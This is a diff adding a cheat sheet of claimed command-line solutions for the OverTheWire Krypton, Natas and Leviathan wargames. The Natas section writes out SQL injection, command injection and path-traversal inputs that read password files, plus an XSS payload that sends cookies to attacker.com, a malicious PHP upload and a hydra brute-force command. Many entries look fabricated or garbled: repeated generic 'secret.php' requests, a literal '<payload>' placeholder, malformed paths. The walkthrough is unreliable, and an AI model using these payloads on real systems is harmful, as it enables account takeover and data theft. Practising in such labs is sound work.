@@ -1,0 +1,179 @@
+KRPYTON - 0 TO 6 LEVEL COMMANDS
+# Level 0
+ssh krypton0@krypton.labs.overthewire.org -p 2231
+cat krypton0/krypton1
+
+# Level 1
+ssh krypton1@krypton.labs.overthewire.org -p 2231
+cat krypton1/krypton2 | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# Level 2
+ssh krypton2@krypton.labs.overthewire.org -p 2231
+cat krypton2/krypton3
+
+# Level 3
+ssh krypton3@krypton.labs.overthewire.org -p 2231
+cat krypton3/krypton4 | xxd -r -p
+
+# Level 4
+ssh krypton4@krypton.labs.overthewire.org -p 2231
+cat krypton4/krypton5
+
+# Level 5
+ssh krypton5@krypton.labs.overthewire.org -p 2231
+cat krypton5/krypton6 | base64 -d
+
+# Level 6
+ssh krypton6@krypton.labs.overthewire.org -p 2231
+cat krypton6/krypton7 | openssl enc -d -aes-256-cbc -a -salt
+
+NATAS - 0 TO 34 LEVEL COMMANDS
+
+
+### Natas Level 0:
+curl http://natas0.natas.labs.overthewire.org/
+
+### Natas Level 1:
+curl http://natas1.natas.labs.overthewire.org/
+
+### Natas Level 2:
+curl -d "username=natas2' OR 1=1-- &password=anything" http://natas2.natas.labs.overthewire.org/
+
+### Natas Level 3:
+curl "http://natas3.natas.labs.overthewire.org/?id=1' AND SLEEP(5)--"
+
+### Natas Level 4:
+curl "http://natas4.natas.labs.overthewire.org/?page=; cat /etc/natas_webpass/natas5"
+
+### Natas Level 5:
+curl "http://natas5.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas6"
+
+### Natas Level 6:
+curl "http://natas6.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas7"
+
+### Natas Level 7:
+curl "http://natas7.natas.labs.overthewire.org/index.php?page=.../.../.../.../.../etc/natas_webpass/natas8"
+
+### Natas Level 8:
+curl -H "Authorization: Basic bmF0YXM4Om5hdGFzOA==" http://natas8.natas.labs.overthewire.org/
+
+### Natas Level 9:
+curl -H "Host: natas9.natas.labs.overthewire.org" -H "Cookie: PHPSESSID=malicious" http://natas9.natas.labs.overthewire.org/
+
+### Natas Level 10:
+curl "http://natas10.natas.labs.overthewire.org/?id=<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
+
+### Natas Level 11:
+curl -F "uploadedfile=@evil.php" http://natas11.natas.labs.overthewire.org/upload/
+
+### Natas Level 12:
+curl -X POST -d "user=admin&password=admin" http://natas12.natas.labs.overthewire.org/
+
+### Natas Level 13:
+curl "http://natas13.natas.labs.overthewire.org/index.php?needle=; cat /etc/natas_webpass/natas14"
+
+### Natas Level 14:
+curl -b "PHPSESSID=malicioussessionid" http://natas14.natas.labs.overthewire.org/
+
+### Natas Level 15:
+curl "http://natas15.natas.labs.overthewire.org/admin/index.php"
+
+### Natas Level 16:
+curl "http://natas16.natas.labs.overthewire.org/admin/login.php"
+
+### Natas Level 17:
+curl "http://natas17.natas.labs.overthewire.org/index.php?file=/etc/natas_webpass/natas18"
+
+### Natas Level 18:
+curl -X POST -d "<payload>" http://natas18.natas.labs.overthewire.org/
+
+### Natas Level 19:
+curl "http://natas19.natas.labs.overthewire.org/"
+
+### Natas Level 20:
+curl "http://natas20.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 21:
+curl "http://natas21.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas22"
+
+### Natas Level 22:
+curl -X POST -d "username=admin&password=admin" http://natas22.natas.labs.overthewire.org/
+
+### Natas Level 23:
+curl -b "loggedin=admin" http://natas23.natas.labs.overthewire.org/
+
+### Natas Level 24:
+curl "http://natas24.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 25:
+curl -b "PHPSESSID=sessionid" http://natas25.natas.labs.overthewire.org/
+
+### Natas Level 26:
+curl "http://natas26.natas.labs.overthewire.org/index.php?file=../../../../etc/natas_webpass/natas27"
+
+### Natas Level 27:
+curl "http://natas27.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 28:
+curl "http://natas28.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 29:
+curl "http://natas29.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 30:
+hydra -l natas30 -P /path/to/wordlist http://natas30.natas.labs.overthewire.org/
+
+### Natas Level 31:
+curl "http://natas31.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 32:
+curl "http://natas32.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 33:
+curl "http://natas33.natas.labs.overthewire.org/secret.php"
+
+### Natas Level 34:
+curl "http://natas34.natas.labs.overthewire.org/secret.php"
+
+LEVIATHAN - 0 TO 7 LEVEL COMMANDS
+
+# Level 0
+ssh leviathan0@leviathan.labs.overthewire.org -p 2223
+ls -la
+./check
+
+# Level 1
+ssh leviathan1@leviathan.labs.overthewire.org -p 2223
+ls -la
+./server
+
+# Level 2
+ssh leviathan2@leviathan.labs.overthewire.org -p 2223
+ls -la
+./printfile /etc/leviathan_pass/leviathan3
+
+# Level 3
+ssh leviathan3@leviathan.labs.overthewire.org -p 2223
+ls -la
+strings ./level3
+
+# Level 4
+ssh leviathan4@leviathan.labs.overthewire.org -p 2223
+ls -la
+cat .backup/bookmarks.html
+
+# Level 5
+ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+ls -la
+./leviathan5
+
+# Level 6
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+ls -la
+./leviathan6
+# (Use input overflow trick)
+
+# Level 7
+ssh leviathan7@leviathan.labs.overthewire.org -p 2223
+ls -la
+cat /etc/leviathan_pass/leviathan8
